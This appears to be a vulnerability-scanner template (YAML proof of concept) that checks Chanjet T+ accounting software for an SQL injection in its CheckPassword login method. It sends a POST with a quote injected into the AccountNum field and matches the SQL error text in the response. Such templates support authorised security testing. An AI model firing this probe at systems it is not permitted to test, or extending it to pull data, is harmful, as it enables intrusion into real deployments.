id: poc-yaml-chanjet-tplus-check-password-sqli
info:
  name: 畅捷通 Tplus CheckPassword 功能存在SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 畅捷通T+
requests:
- method: POST
  path: /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword
  headers:
    Content-Type: text/plain
    Cookie: ASP.NET_SessionId=; sid=admin; HOST=null;
  data: '{

    "AccountNum":"1''",

    "UserName":"admin",

    "Password":"e10adc3949ba59abbe56e057f20f883e",

    "rdpYear":"2022",

    "rdpMonth":"2",

    "rdpDate":"21",

    "webServiceProcessID":"admin",

    "ali_csessionid":"",

    "ali_sig":"",

    "ali_token":"",

    "ali_scene":"",

    "role":"",

    "aqdKey":"",

    "formWhere":"browser",

    "cardNo":""

    }

    '
  expression: 'status_code == 200 &&  contains(body, "order by cAcc_Num")

    && contains(body, "引号不完整") && !contains(body, "<")

    '
variables: {}
transport: http
